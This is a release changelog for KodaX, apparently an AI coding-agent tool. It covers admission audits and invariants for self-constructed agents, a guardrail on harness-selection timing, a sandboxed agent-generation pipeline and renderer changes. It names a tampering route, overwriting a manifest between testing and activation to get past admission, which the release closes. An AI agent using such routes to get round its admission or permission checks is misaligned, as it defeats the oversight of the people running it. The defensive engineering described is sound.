Three coupled features close out v0.7.31: **FEATURE_101** turns Layer A's structural "agent + handoffs + guardrails" types into an admission contract — `Runner.admit(manifest)` runs an 8-invariant 5-step audit before a manifest can boot; **FEATURE_089** lifts FEATURE_088 self-construction from tools to agents (5-step staircase: scaffold → validate → stage → test → activate), with sandbox runner + within-session re-admission gate at activate-time; **FEATURE_106** replaces v0.7.30's silent scope-reflection with a `ToolGuardrail`, rewrites the Scout role-prompt's quality framework (hard rule: "≥2 files OR start a project from scratch → must `emit_scout_verdict` BEFORE the first write"), and registers `harnessSelectionTiming` as the 8th admission invariant. Stage 1 benchmark across 8 coding-plan provider/model alias × 6 task × 2 prompt variant (96 cells, 11m29s wall-clock) drops the multi-file-H0 leakage rate from **15.6% → 0.0%** (acceptance gate ≤5%) with H1-class pass rate jumping +50 percentage points (37.5% → 87.5%) and `pre_emit_commitment_rate` 65.6% → 84.4% (≥70% gate). Stage 2 reasoning sweep (108 cells, 6 task × 3 alias × 2 prompt × 3 reasoning, 7m57s) shows reasoning depth has zero effect on multi_file_h0_rate (current: 8.3% across quick/balanced/deep; feature_106: 0.0% across all three) — reverses the v0.7.30 "reasoning ⇒ over-confident H0" hypothesis and grants FEATURE_103 reasoning `default=balanced` keep status on quantitative grounds, not assumption. Stage 3 production-fidelity eval (3 cells: real LLM × `createRolePrompt('scout', ...)` × `Runner.run` × mock mutation tools) closes the remaining gap: 3/3 alias (`zhipu/glm51` / `ds/v4pro` / `kimi`) all walk the **committed-early** path — Scout reads / greps to gather context, then calls `emit_scout_verdict({confirmed_harness:H1_EXECUTE_EVAL})` without writing any files. Guardrail does not need to fire because the production Scout prompt's "Do NOT do the implementation yourself for H1/H2 tasks" rule is honored upstream; zero `composition-fail` cells.

### Added

- **FEATURE_101 — Constructed Agent Admission Contract (`Runner.admit`)**: New admission layer in `@kodax/core` turns structural agent manifests into runnable agents only after a 5-step audit passes. **Layer A surface**: `AgentManifest` + `InvariantId` + `ManifestPatch` (monotone: `tools` only narrows, `handoffs` only narrows, `maxBudget` only decreases) + `composePatches` (min-wins for budget, intersection for tools/handoffs) + `applyManifestPatch` (idempotent, monotonicity-checked) + `InvariantResult` discriminated union (`ok`/`reject`/`clamp(with patch)`/`warn`) + `QualityInvariant` 3-hook model (`admit`/`observe`/`assertTerminal`) + `AdmissionVerdict` (`ok+manifest+patches+warnings` | `reject+reason+retryable`). **5-step audit pipeline**: (1) schema-validate the manifest; (2) run each registered invariant's `admit` hook in declared order; (3) compose all returned patches, fail if any reject; (4) apply composed patch monotonically to manifest; (5) re-audit composed manifest to catch second-order rejects. **8 v1 invariants registered**: `finalOwner` (handoff graph terminates at a single owner), `handoffLegality` (no cycles, no orphan kinds), `evidenceTrail` (mutating tools imply at least one observer in the chain), `harnessSelectionTiming` (FEATURE_106's 8th invariant — H1/H2 mutation must precede `emit_scout_verdict`), `budgetCeiling` (declared `maxBudget` ≤ system cap), `toolPermission` (declared tools fall within capability tier whitelist; `bash:network` requires explicit override), `boundedRevise` (revisions are a finite chain, no unbounded retry loops), `independentReview` (if a `qa-reviewer` role appears, it must be a different name from the generator). **Capability classification**: `resolveToolCapability(name)` maps tool names to one of `read` / `edit` / `bash:test` / `bash:read-only` / `bash:mutating` / `bash:network` / `subagent` tiers. Repo-intel tools (`repo_overview` / `changed_scope` / etc.) classified as `read`; worktree / construction tools as `subagent`. **Layered architecture**: pure invariants in `packages/core/src/invariants/` (no `@kodax/coding` dep); capability-coupled invariants (`budget-ceiling` / `tool-permission` / `bounded-revise` / `independent-review`) in `packages/coding/src/agent-runtime/invariants/`. `registerCodingInvariants()` calls `registerCoreInvariants()` then layers the 4 capability-coupled ones. **Tests**: 51 new tests across 8 invariant test files + admission-runtime + admission-audit; all tests green. **HIGH fix during review-gate**: `invariantBindings` previously included unregistered ids, masking missing registrations as silent no-ops; filtered to ids where `getInvariant(id)` resolves so unknown declared ids surface as a clear retryable error.

- **FEATURE_089 — Self-Construction Tier 3: Agent Generation**: Mirrors FEATURE_088's tool construction staircase but produces `Agent` manifests instead of `KodaXToolDefinition`. Five new internal tools form the agent generation pipeline: `scaffold_agent` (emits a fillable `AgentArtifact` skeleton), `validate_agent` (dry-run admission audit on candidate JSON; no disk write), `stage_agent_construction` (persists under `.kodax/constructed/agents/<name>/<version>.json`), `test_agent` (manifest shape check + `Runner.admit` + sandbox-runner case execution against an injected LLM callback), `activate_agent` (invokes the construction policy gate, flips `status=active`, records contentHash, and registers the agent in the resolver so `Runner.run` can find it by name). **Discriminated union extension**: `ConstructionArtifact` widened from `tool` only to `tool | agent` (kind dispatch in helpers, no type-guards everywhere); `ToolArtifact` and `AgentArtifact` differ only in `kind` and `content` shape (`AgentContent` carries `instructions` + `tools[]` + `handoffs[]` + `reasoning` + `guardrails[]` + `model` + `provider` + `outputSchema` + `testCases[]` + `maxBudget` + `declaredInvariants[]`). **Admission bridge** (`admission-bridge.ts`): pure `buildAdmissionManifest({name, content})` lifts `AgentContent` (refs as strings) → `AgentManifest` (refs as structural `Agent` stubs) for `Runner.admit` consumption. **Resolver** (`agent-resolver.ts`): module-singleton `AGENT_REGISTRY` parallel to `TOOL_REGISTRY`; `registerConstructedAgent(artifact)` returns an unregister callback the `ConstructionRuntime` stores in its `_activated` map; tool refs lifted through `TOOL_REGISTRY` snapshot at activation time. **Sandbox runner** (`sandbox-runner.ts`): drives `testCases` through `Runner.run` with `Promise.race` wall-clock budget (default 30s; AbortSignal alone is advisory because Runner.run's LLM callback may not honor it). Each case graded against `expectMatch`/`expectNotMatch`/`expectFinalText`. **Within-session tampering closed**: `activate()` re-runs `Runner.admit` for kind=`agent` so a write tool overwriting the manifest between `test_agent` and `activate_agent` cannot bypass admission. **Tests**: 87 new tests across runtime-agent / agent-resolver / agent-runner-integration / sandbox-runner / admission-bridge / agent-construction; 185 total construction tests green.

### Changed

- **FEATURE_106 — AMA Harness Selection Calibration**: Replaces v0.7.30's silent `scope-reflection` middleware (which split off a separate ToolGuardrail-like surface only on the FEATURE_084 path) with a unified `ToolGuardrail.afterTool` hook (`scope-aware-harness-guardrail.ts`), idempotent on `tracker.reflectionInjected`. **Scout role-prompt rewrite** (`packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts`): the §QUALITY FRAMEWORK section is rewritten — H0 reframed from "default" to "Bounded mutation OR pure answer (≤1 file ≤30 lines mutation OR no file mutation at all)"; H0/H1/H2 examples now quantified (H1: ≥2 files OR >30 lines; H2: project from scratch / cross-module refactor); the subjective "SCOPE SELF-CHECK" replaced with a **SCOPE COMMITMENT (hard rule)**: "If you intend to write ≥2 files OR start a project from scratch, call `emit_scout_verdict({confirmed_harness: H1 or H2})` BEFORE the first write. The scope guardrail will surface belated commitments and slow you down." Declarative `Guardrail` markers on `scoutSpec`/`generatorSpec` in `coding-agents.ts`. `runner-driven.ts` wires `createScopeAwareHarnessGuardrail` into the AMA path. **`harnessSelectionTiming` invariant** registered as FEATURE_101's 8th: detects when the manifest declares H1/H2 work but the runtime trace shows the first mutation preceding the `emit_scout_verdict` tool call. **Eval (Stage 1)**: 96 cells × 8 alias / 6 task / 2 prompt variant × 1 run, 11m29s wall-clock. Multi-file H0 leakage rate **15.6% → 0.0%**, H1 class pass rate **37.5% → 87.5%** (+50pp), `pre_emit_commitment_rate` **65.6% → 84.4%** (hard rule eliminates all 5 wrong-harness cases). Apparent H0/H2 -12.5pp regressions are all benchmark-format failures from models trying to actually use `read`/`grep`/`bash` to verify lookup answers (correct production behavior, not classification errors); the harness can't provide tools, so those outputs lack a parseable `HARNESS:` line. Per-cell verification confirms zero new mispicks under `feature_106`. **Eval (Stage 2 reasoning sweep)**: 108 cells × 3 alias × 2 prompt × 3 reasoning (low/medium/high) × 1 run, 7m57s wall-clock. Reasoning depth has **zero effect on multi_file_h0_rate** (current: 8.3% / 8.3% / 8.3%; feature_106: 0.0% / 0.0% / 0.0%) — reverses v0.7.30's "deeper reasoning ⇒ over-confident H0" hypothesis. Per Eval Plan decision matrix ("三档差异在 noise 内 → 保留 FEATURE_103"), keep `default=balanced` / `max=deep` / `escalateOnRevise=false`. Harness extension to support per-call reasoning was 5 small edits in `benchmark/harness/harness.ts` (`provider.stream`'s 4th arg already accepted `KodaXReasoningRequest` since v0.7.0, harness just wasn't passing it).

- **`ConstructionRuntime` discriminated extension**: `runtime.ts::test()` and `registerActiveArtifact()` now dispatch on `artifact.kind`. `SUPPORTED_KINDS = ['tool', 'agent']`. Tool path is byte-identical to v0.7.30; agent path adds `testAgentArtifact` (admission bridge + sandbox) and `registerActiveAgentArtifact` (resolver wiring + revoke unregister). FEATURE_088 builders (`buildToolArtifact`) narrowed to `Partial<ToolArtifact> → ToolArtifact` so the discriminant is preserved through factory paths. No regressions: existing 49 runtime tests + 4 e2e tests continue to pass alongside the 87 new agent-side tests.

### Tests

- 1,629 `@kodax/coding` tests pass (185 in `packages/coding/src/construction/` covering both tool and agent paths). `@kodax/core` admission test suite (51 tests) green. Full workspace build clean.

### Migration

- No user-facing migration required. FEATURE_101's `Runner.admit()` is opt-in for callers building agents from a manifest; all existing `Runner.run()` paths in REPL / coding / mcp continue to work without change. FEATURE_089's 5 new construction tools are gated behind the same construction-policy permission gate as FEATURE_088's tool tools — non-interactive surfaces continue to reject activation by default. FEATURE_106's prompt rewrite ships in the production Scout role-prompt; restart of an active KodaX REPL session is sufficient to pick it up.

### Post-release implementation completion patches (folded into v0.7.31 tag)

The v0.7.31 tag points at HEAD = `5456d9a`, which includes two post-release audit patches and one review follow-up on top of the original `9ef5aad` release commit. All three close silent-footgun gaps surfaced after the initial commit; none change documented v0.7.31 behavior. Captured here so the tag-to-release-notes correspondence is unambiguous.

#### v0.7.31.1 — FEATURE_101 implementation completion patch (commit `4668732`)

8 admission-runtime wiring gaps closed:

- `admission-session.ts` — `setAdmittedAgentBindings` / `getAdmittedAgentBindings` WeakMap binding registry promoted from per-test scaffolding to first-class production primitive that carries `{bindings, manifest}` for the dispatch site to consult.
- `admission-metrics.ts` — `_incAdmitOk(clamped)` / `_incAdmitReject(retryable)` rate counters wired so `admission_clamp_rate` / `admission_reject_after_retry_rate` / `invariant_violation_rate` can be queried at runtime instead of computed from logs.
- `runner.ts` admit-time double-wrap fix — `buildSystemPrompt` no longer wraps a manifest's instructions twice when the manifest was already admitted (TRUSTED_HEADER + role spec + TRUSTED_FOOTER fence). Q6 baseline (5 tasks × 8 alias) re-verified post-fix at 40/40 cells 100/100.
- Runtime-clamp invariant hooks — `runner.ts`'s tool-result callback synchronously calls `invariantSession.recordMutation` so `evidenceTrail.observe` sees individual file events; `mutationTracker.files.size` exposed for threshold-class assertions.
- Same-batch handoff cycle detection — `handoffLegality.admit` now consults `ctx.stagedAgents` (in addition to `activatedAgents`) so two manifests staged together with `A→B` and `B→A` cannot slip through admission individually-each.
- Debug flag — `KODAX_ADMISSION_DEBUG=1` env triggers verbose admission audit logs for offline trace replay.
- Built-in handoff resolution — `Runner.admit` resolves built-in agent names (`generator`, `evaluator`, `planner`, `scout`) to the canonical specs in `coding-agents.ts` so a manifest declaring a handoff to one of them by name no longer rejects with "unknown target".
- Q3 retry-cap rollback — the v0.7.31.1 first-cut implementation added per-name `KODAX_ADMISSION_RETRY_CAP` env defense; threat-model audit confirmed it solved a non-existent threat (KodaX is single-user CLI, no retry-attack surface) and was over-engineered. Reverted before commit.

#### v0.7.31.2 — FEATURE_101/106 second implementation completion patch (commit `ff22562`)

5 silent-footgun gaps closed:

- **SA mutation-reflection text rewrite (CAP-016)** — `packages/coding/src/agent-runtime/middleware/mutation-reflection.ts` removed the dead AMA-escalation hint that referenced `emit_managed_protocol`. Per ADR-003, SA mode is direct execution with no mid-run harness escalation; the legacy text was inherited from a pre-FEATURE_106 era and induced hallucinated tool calls in real models. New text is SA-self-review oriented (re-read diff / run typecheck/tests / suggest user re-run under AMA mode). Real-LLM benchmark across 8 coding-plan providers × 3 task scenarios shows **100% safety judges pass, zero hallucinated AMA tool calls**.
- **`toolPermission` classifier expansion** — 9 NEW tool names added to the `subagent` tier classification: 4 canonical AMA emit (`emit_scout_verdict` / `emit_contract` / `emit_handoff` / `emit_verdict`) + 5 FEATURE_089 staircase (`scaffold_agent` / `validate_agent` / `stage_agent_construction` / `test_agent` / `activate_agent`). Internal admission audit, not LLM-facing — no benchmark needed. +2 unit tests.
- **`independentReview` stagedAgents fallback** — `reachableNames` now consults `ctx.stagedAgents` so a same-batch staging where the planner's handoff captured a stub generator before the staged generator's full topology was scaffolded still admits correctly. Mirrors `handoffLegality`'s authoritative-resolution pattern (activated > staged > inline target). +1 unit test.
- **`registerActiveArtifact` exhaustiveness guard** — `const _exhaustive: never = artifact` assertion + throw added so a future tier-3 artifact kind cannot silently fall through. Defensive only.
- **`clampMaxIterations` real implementation** — added `AgentManifest.maxIterations` field (symmetric with `maxBudget`), `applyManifestPatch` apply branch (monotone, only narrows), and `Runner.run` min-wins wiring through the WeakMap binding registry: `getAdmittedAgentBindings(startAgent)?.manifest.maxIterations` against `RunOptions.maxToolLoopIterations`. **Scope: per-run, not per-agent** — the cap is read from the entry agent's manifest once before the tool loop; v1 admission audits at run entry only, no per-handoff reclamping. Successor agents share the entry cap as the run total. +2 unit tests + 5 integration tests in new `runner-iteration-clamp.test.ts`.

#### v0.7.31.2 review follow-up (commit `5456d9a`)

5 documentation/comment-drift fixes from the post-commit independent review (no production behavior changes):

- `bounded-revise.ts` — comment claimed `AgentManifest` doesn't carry `maxIterations`; rewritten to explain v0.7.31.2 added the field + apply path + Runner.run wiring while clarifying that the invariant's own admit-time hook stays observe-only by design.
- `cap-016-mutation-reflection.contract.test.ts` — file header docstring's "six canonical lines" updated to the post-rewrite shape (header + senior-engineer rhetorical line + 3 self-review action lines).
- `benchmark/datasets/sa-mutation-reflection/README.md` — added a "Caveat on the safety-pass-rate claim" section: the simplified `SA_IDENTITY` prompt names the forbidden tools by name and the safety judges check for those same names, so 100% safety pass proves "system prompt + judge are in agreement", not that the new reflection text alone suppresses hallucination. cap-016 contract test (text doesn't seed forbidden names) is the load-bearing assurance.
- `docs/features/v0.7.31.md` §v0.7.31.2 — Fix #2 row now lists the 9 NEW tool names explicitly with a note that the v0.7.31.2 commit message body's per-name attribution was wrong (count is correct, attribution isn't); Fix #5 row gained a "Scope note" paragraph on per-run vs per-agent semantics.
- `runner.ts` (around line 490) — added the same scope-note inline at the iterationCap site, naming the change point a future v2 would modify (re-read `getAdmittedAgentBindings(handoffSignal.to)` at the handoff site) so reading the code alone tells you the cap is intentionally entry-agent-scoped, not an oversight.

---

## [0.7.30] - 2026-04-29

### Theme

Cell-level diff renderer becomes the sole render path (FEATURE_057 Track F closes — legacy `log-update.js` factory + opt-out gate + 12 dead files retired, ~150 lines of `engine.js` rewritten to dispatch through `applyCellFrame` unconditionally). Bounded-memory runtime hardening lands as FEATURE_060 (Tier 1 caps `findLastFencedBlock` at a 128KB tail-window + transcript at `TRANSCRIPT_HARD_LINE_CAP = 100K` lines; Tier 2 ports claude-code's UUID-anchored 200-item cap + `useDeferredValue` + transcript-mode 30-message visible cap, restoring `kodax -c` resume responsiveness on Windows-SSH). Windows-SSH host detection (FEATURE_096, originally planned `v0.7.39`, migrated in) routes ConPTY hosts to a main-screen + spinner-preserved policy with the `KODAX_FULLSCREEN` three-state escape hatch. Three review-stage / hotfix patches before tag (Phase 6 cursor-visibility regression, `resetOutputTracking` not reseeding `prevFrame`, `outputToScreen` row-overflow crash) preserve byte-level invariants the legacy paths required.

### Added

- **FEATURE_060 — Bounded-Memory Runtime + OOM Hardening (Tier 1 boundedness landed)**: Three concrete code changes plus 7 new regression tests pin the bounded-retention invariants the design called for. **Track 1 (managed-worker retention)**: `findLastFencedBlock` in `task-engine/_internal/managed-task/parse-helpers.ts` switched to a tail-only scan when text exceeds 128KB (`FENCED_BLOCK_SCAN_TAIL_THRESHOLD`). Managed-protocol fenced blocks are emitted at the end of LLM responses by convention (post-visible-text), so scanning the trailing 128KB instead of the full payload bounds regex cost on runaway/malformed LLM output (verbose-mode loops, repeated-injection attacks, malformed protocol streams). The `index` is mapped back to full-text coordinate space so callers using `text.slice(0, block.index)` continue to receive the correct visible-text prefix. **Track 2 (output-mode retention)**: removed the redundant `messages: [...result.messages]` spread at `runner-driven.ts:4747`. `result.messages` was already cloned at line 4676 from `runResult.messages`; spreading again here created a third full transcript copy in memory. `saveSessionSnapshot` doesn't mutate the passed array, so reference-passing is safe. **Track 3 (transcript boundedness)**: replaced `Number.POSITIVE_INFINITY` in `InkREPL.tsx:transcriptMaxLines` with `TRANSCRIPT_HARD_LINE_CAP = 100_000` (~10MB of materialized rows — orders of magnitude beyond any realistic interactive session). Added `THINKING_SHOW_ALL_HARD_CHAR_CAP = 200_000` per-block char cap that fires even when `showAllContent` is on (previously the show-all branch bypassed all caps and returned `item.text` directly). The thinking-case dispatch in `buildTranscriptRows` now routes show-all through `buildThinkingPreview` so the cap is consistently enforced; truncated content gets a hint pointing at session artifacts. **Track 4 (regression tests)**: 4 new tests in `parse-helpers.test.ts` (tail-window scan, full-text scan, oversized-prefix straddling, absent-block-in-tail-window) + 3 new tests in `transcript-layout.test.ts` (finite-cap export sanity, oversized thinking under show-all, under-cap thinking pass-through). **What's NOT in scope (with documented triggers)**: intra-round `runResult.messages` collapse — the substrate-level redesign required (autoReroute / sanitize-thinking / error-recovery middleware all reach into `result.messages` during a round) is profile-driven and deferred until a concrete heap-pressure repro warrants it; proper viewport virtualization (only materializing visible rows) is a separate refactor — the Tier 1 hard caps deliver the boundedness invariant Track 3 required without the architectural cost; headless `--print`-style output mode — KodaX has no equivalent CLI entry; deferred until that product surface exists. Tests: `packages/coding` + `packages/repl` 2,464 passing / 1 pre-existing Windows EPERM flake unrelated to this change. TypeScript clean. **FEATURE_060 Status: Completed (Tier 1).**

- **FEATURE_057 Track F Phase 6 — Legacy renderer retired (Track F closes)**: The `log-update.js` factory + `cursor-helpers.js` shim + `KODAX_TRACK_F` opt-out gate + `RenderOptions.incrementalRendering` typed shim are all gone. Cell-level diff renderer is now KodaX's only render path. **Phase 6 review-stage fixes (2026-04-29)**: post-implementation review caught two regressions that landed alongside the renderer retirement and were patched before release. **(1) Cursor visibility regression** — legacy `log-update.js`'s `createStandard` called `cliCursor.hide(stream)` on first render (default `showCursor=false`); Phase 6's deletion dropped this hide call, so the OS terminal cursor would otherwise blink at the bottom-left of the rendered UI (post-render cursor lands at `(0, screen.height)`). Fix: `engine.js` now emits a one-time `\x1b[?25l` write at the start of the first `onRender` (gated to non-CI / non-debug / non-screen-reader paths), paired with `App.js`'s existing useEffect cleanup `cliCursor.show(stdout)` on unmount. **(2) `resetOutputTracking` not reseeding `prevFrame`** — callers (`setShellMode` / `setAltScreenActive`) invoke the reset when alt-screen toggles or mouse-tracking flips happen outside the cell-renderer pipeline; without an `invalidateCellFrame()` call the next `applyCellFrame` would diff against a stale `prevFrame` and leave rows un-repainted. Fix: added `this.invalidateCellFrame()` to `resetOutputTracking`, symmetric with the other write-paths (`writeToStdout` / `writeToStderr` / `clear` / fullscreen-branch) that already invalidate after writing outside the cell pipeline. Two new regression tests in `engine.test.ts` pin both invariants (one-time cursor hide + prevFrame reseed on alt-screen toggle). **Files deleted (12 paths)**: `core/internals/log-update.js` (310 lines, engine-side legacy), `substrate/ink/log-update.js` (241 lines) + .map, `substrate/ink/cursor-helpers.js` (55 lines) + .map (only consumer was log-update), and four substrate-side dead files (`ink.js` 769 lines + .map, `render.js` + .map, `index.js` + .map, `instance.js` orphan vendored leftover) — production runtime never instantiated the substrate `Ink` class; everything went through `core/engine.js`. Phase 6a audit confirmed dead-code via `git grep -E "from.*substrate/ink['\"]"` returning zero hits across the repo. **engine.js surgery (~150 lines rewritten)**: dropped `import logUpdate`, `this.log = logUpdate.create(...)`, `throttledLog = throttle(...)`. `onRender`'s fullscreen branch `this.log.clearAndRender(fullFrameOutput)` → `stdout.write(eraseLines + fullFrameOutput)` as one atomic write (preserves FEATURE_096 Win10 OpenSSH/ConPTY fix); has-static branch `this.log.clear() + write(staticOutput) + this.log(outputToRender)` → `stdout.write(eraseLines + staticOutput) + invalidateCellFrame() + applyCellFrame(frame)`; legacy fallback `else if (output !== this.lastOutput || this.log.isCursorDirty())` deleted entirely (cell renderer always claims dispatch); `restoreLastOutput` rewritten to replay `prevFrame` via `cellLogUpdate.render(emptyFrame, prevFrame) + applyDiff` (cell-renderer-based restore keeps `prevFrame` consistent with screen state, no separate invalidate after); `writeToStdout` / `writeToStderr` / `clear()` / `resized()` / `setCursorPosition` / `resetOutputTracking` / `unmount` cleanup all dropped their `this.log.*` calls; `unmount`'s `throttledLog` flush + `this.log.done()` cleanup gone (cell renderer is stream-stateless). **renderer.js (substrate + core mirror)**: removed `isCellLevelRendererEnabled` import + the `if (isCellLevelRendererEnabled())` gate around `frame` construction — frame is now populated unconditionally on the non-screen-reader path. **cell-renderer.ts**: deleted `isCellLevelRendererEnabled` function + module JSDoc rewritten. **RenderOptions.incrementalRendering**: deleted from `tui/core/root.tsx` interface + two `incrementalRendering: false` defaults. **Tests**: 19-test delta (cell-renderer.test.ts gate suite + opt-out tests in both renderer.test.ts mirrors deleted, no longer a gate to test); engine.test.ts full rewrite (assertions migrated from `mocks.log.*` legacy mock to `mocks.stdoutWrite` actual user-visible behavior, fixtures use `createScreen` so `applyCellFrame` exercises the real cell renderer); 940/940 green in repl package, full repo regression: 367/373 files passing (6 pre-existing Windows EPERM/ENOENT temp-dir race flakes under high parallel load, all re-running clean in isolation). TypeScript build clean. **Risk eval**: deletion-heavy parts (substrate dead code, gate, option) are zero-risk; engine.js surgery preserves byte-level invariants the legacy paths required (single atomic write for SSH/ConPTY fullscreen, eraseLines+content for has-static, eraseLines+data+replay for writeToStdout). The `restoreLastOutput` rewrite is strictly more correct than legacy (cell renderer's diff is sound where log-update's `this.log(lastOutputToRender)` depended on bookkeeping consistency). No `KODAX_TRACK_F=off` opt-out anymore — users wanting to revert use a prior version. **Track F (cell-level diff renderer absorbing FEATURE_095) is complete.**

- **FEATURE_057 Track F Phase 5d + 5e — Cell renderer becomes default + stale SSH tune cleanup**: Phase 5d flips `isCellLevelRendererEnabled` from strict-equality `=== "on"` (opt-in) to strict-inequality `!== "off"` (opt-out). Cell renderer is now the default render path on every code path that previously honored the flag (`substrate/ink/{ink,renderer}.js` + `core/{engine.js,internals/renderer.js}`). Emergency rollback path remains a single env-var: `KODAX_TRACK_F=off` reverts to the legacy `log-update.js` factory and behavior is byte-identical to pre-Track-F (both renderers continue to be constructed unconditionally; only the dispatch branch differs). Strict-inequality matching (vs three-state truthy parsing) keeps the surface minimal for Phase 6's gate deletion. **Comment hygiene**: 5 stale "Initialized only when `KODAX_TRACK_F=on`" comments in `ink.js` / `engine.js` / `renderer.js` × 2 / `InkREPL.tsx` rewritten to reflect default-on semantics; the `incrementalRendering disabled - causes cursor positioning issues with custom TextInput` comment in `InkREPL.tsx` (a v0.7.0-era diagnosis of the exact symptom Track F's absolute-cursor diff resolves) replaced with a Phase 5d/6 forward note. **Phase 5e** was smaller than planned: the `KODAX_INCREMENTAL_RENDERING + sshDetected + maxFps: 15` interim SSH B-plan branch the design doc anticipated was never actually landed in code (verified via `git log --all -S` zero-hit), so 5e collapsed to documenting `RenderOptions.incrementalRendering` as a typed shim no-op under default-on (Phase 6 will delete the field with the legacy renderer). **Tests**: 4 flag-gate test files rewritten (cell-renderer + substrate renderer + core renderer + 6 strict-inequality value cases × 2 mirrors); full repl package 121 files / 959 tests green; TypeScript build clean. **Risk evaluation**: 5d is the user-facing behavior change — every Windows-Terminal / VS Code / POSIX / SSH user gets the new renderer on first v0.7.30 launch. Algorithm is structurally identical to CC reference (`c:/Works/claudecode/src/ink/log-update.ts`), burned in via 192 + 11 + 46 test fixtures across Phase 4 + 5 step 1 + 5 step 2.

- **FEATURE_057 Track F Phase 5 step 2 — First-render path CC-aligned (cleanup)**: Removes a small but principled deviation from CC reference. KodaX's `LogUpdate.render` carried a `prev.screen.height === 0` short-circuit that routed first-render through `renderFullFrame`, leaving the cursor mid-row at the last painted glyph; `apply-cell-frame.ts` then emitted an explicit post-write `\n` to realign the cursor for subsequent incremental moves. The `\n` was correct in normal cases but introduced a fullscreen-fit drift (Phase 4 review's MEDIUM-1) — patched then with a `screen.height < viewport.height` guard. Phase 5 step 2 deletes both the short-circuit and the explicit `\n` (and its guard). Empty-prev → non-empty-next now flows through the incremental path naturally: `diffEach` skips every coordinate (`growing && y >= 0`), `renderFrameSlice` paints all rows with row-final `\r\n`, `restoreCursor` is a structural no-op when `next.cursor.y === screen.height`. The algorithm is now a single shape regardless of whether `prev` was empty or populated. Mirrors `c:/Works/claudecode/src/ink/log-update.ts:123-466` exactly. Two tests rewritten in `cell-renderer.test.ts` (first-render now asserts `\r\n` emission via incremental, not `[{stdout:"ab"}]` from `renderFullFrame`); four tests rewritten in `apply-cell-frame.test.ts` (single applyDiff write asserted, viewport-fill guard test deleted as the guard itself is gone). 46/46 green for the touched files; full repl package: 953/953 green; no regressions. Side-task: added KNOWN_ISSUES #126 documenting tmux's default OSC 8 passthrough behavior and the `set -g allow-passthrough on` workaround (pre-existing condition affecting both legacy and cell renderers; recorded for user discoverability).

- **FEATURE_057 Track E — Output ownership & renderer boundary purification (first phase)**: 3 channel-mismatch `console.log` bugs in `InkREPL.tsx` (cancellation feedback, invocation error, Plan-Mode error) routed solely through the React history channel — previously they double-emitted via raw `console.log` which, with `patchConsole: false` (vendored substrate), bypassed Ink and landed in the wrong screen position. `TextInput.useTerminalWidth` now subscribes to the renderer-owned terminal size via `useTerminalSize()` instead of `process.stdout` directly, so the substrate's owned-stdout boundary holds when the renderer is attached to a non-default stream. Audit confirmed `AlternateScreen.tsx`, slash-command callbacks (captured by `executeCommand` wrapper at `InkREPL.tsx:6661-6679`), shutdown sequence (writes after `cleanup()` + `setRawMode(false)` + `stdin.pause()`), and pre-Ink boot writes were already correct. See `docs/features/v0.7.30.md` Track E status section for full audit log.

- **FEATURE_057 Track F Phase 5 step 1 — Engine-mirror integration: cell renderer wired into `core/engine.js` + `core/internals/{output,renderer}.js` (still flag-gated)**: Phase 5 step 1 mirrors the Phase 4 wiring into KodaX's engine-side renderer (the "core mirror" of the vendored ink substrate; design doc requires both renderers to be wired in lockstep). Three sub-steps: **5a** — extracted `Output.getGrid()` in `core/internals/output.js` (mirrors Phase 4a refactor on substrate). **5b** — added optional 3rd `terminalSize` param + `frame` return field to `core/internals/renderer.js`, importing `isCellLevelRendererEnabled` + `outputToScreen` from `../../substrate/ink/` (cross-directory import; the cell-renderer logic lives canonically in substrate/ink — direction is one-way, preserving acyclicity). 11 mirror tests in `core/internals/renderer.test.ts`. **5c** — wired `cellLogUpdate` + `applyCellFrame` + `invalidateCellFrame` into `core/engine.js` (constructor instantiates when flag on; `onRender()` branches before legacy `throttledLog`; `resized()` / `writeToStdout()` / `writeToStderr()` / `clear()` reseed `prevFrame` on legacy-path side effects). KodaX-specific deviation: introduced `OutputLike` duck-typed interface in `output-to-screen.ts` (read-only `width` / `height` / `getGrid()`) so both `substrate/ink/output.js` and `core/internals/output.js` Output instances satisfy the parameter type without `// @ts-ignore` — fixes the previous type lie identified in code review (MEDIUM-1). **Code-review verdict: WARNING (0 CRITICAL, 1 HIGH, 3 MEDIUM, 1 LOW)** — 4 of 5 fixed before merge: HIGH-6 (`invalidateCellFrame` missing on `!shouldRestoreManagedShellAfterExternalWrite()` early-return paths) added the call; MEDIUM-1 (cross-directory type lie) → `OutputLike`; MEDIUM-3 (fullscreen branch returned without invalidating prevFrame, drifting on alt-screen exit) → `invalidateCellFrame()` before fullscreen early-return; MEDIUM-5 (no focused engine.onRender dispatch tests) deferred to Phase 5d with TODO comment (covered indirectly via shared `applyCellFrame.test.ts`); LOW-4 (mid-session dual-renderer flag-flip safety) confirmed safe. **Phase 5d (default flip) + 5e (SSH tune removal) deliberately deferred** for explicit user authorization — both are user-facing behavior changes (existing users would see cell renderer engage by default; FEATURE_096 SSH tune `KODAX_INCREMENTAL_RENDERING` becomes obsolete once cell renderer ships). 11 new tests; combined Phase 1-5-step-1 substrate + core test count: **203 tests**. Repo full suite: 372 files / 3784 tests + 23 todo, zero regressions. TypeScript build clean.

- **FEATURE_057 Track F Phase 4 — Substrate integration: cell renderer wired into `renderer.js` + `ink.js` (still flag-gated)**: Phase 4 closes the substrate-integration risk. Three sub-phases: **4a** ships two new pure modules — `apply-diff.ts` (Patch → terminal-bytes serializer with single-`stream.write` invariant; empty diff skips the write entirely) and `output-to-screen.ts` (vendored `Output` 2D `StyledChar` grid → KodaX `Screen`, with SGR codes landing in `cell.style`, OSC 8 hyperlinks extracted into `cell.hyperlink`, and SpacerTail recreation for wide-char tails). **4a vendored refactor**: `Output.get()` operation-replay loop extracted into a new `Output.getGrid()` method; `get()` now wraps `getGrid()`. Both render paths share the same replay logic so the cell grid stays consistent with the legacy string output. **4b** modifies `renderer.js` to accept an optional 3rd `terminalSize` parameter (so `frame.viewport` reflects the real TTY dimensions, not yoga-computed content size) and returns an additional `frame` field, populated only when `KODAX_TRACK_F=on` and the screen-reader pipeline is off. Legacy `output` / `outputHeight` / `staticOutput` fields remain populated regardless of flag — toggling the flag does not change legacy-path bytes. **4c** wires the cell path into `ink.js`'s `onRender()` hot path: a new branch in the simple-incremental tail (just before `throttledLog`) routes through `applyCellFrame` (a free function in `apply-cell-frame.ts` for unit-testability without React) when the flag is on. Constructor instantiates `cellLogUpdate` + seeds `prevFrame = emptyFrame(rows, cols)` only when the flag is on; mid-session flag flips are explicitly undefined. `resized()` reseeds `prevFrame` with `emptyFrame(rows, currentWidth)` on width-shrink so the next render goes through the full-frame paint path (mirrors the legacy `this.log.clear()` + 